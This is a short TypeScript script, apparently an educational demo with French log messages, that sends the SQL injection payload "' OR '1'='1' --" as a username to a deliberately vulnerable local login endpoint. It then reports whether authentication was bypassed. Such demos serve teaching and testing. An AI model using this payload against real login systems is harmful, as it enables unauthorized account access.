async function demonstrateInjection() {
  const payload = "' OR '1'='1' --";
  const password = "nimporte";

  console.log("Demonstration Injection SQL");
  console.log("Payload:", payload);

  try {
    const response = await fetch("http://localhost:3000/api/login-vulnerable", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: payload, password }),
    });

    const data = await response.json();
    console.log("Reponse:", JSON.stringify(data, null, 2));

    if (data.success) {
      console.log("Vulnerable: Connexion reussie sans mot de passe");
    } else {
      console.log("Protege: Injection bloquee");
    }
  } catch (error) {
    console.error("Erreur:", (error as Error).message);
  }
}

demonstrateInjection();
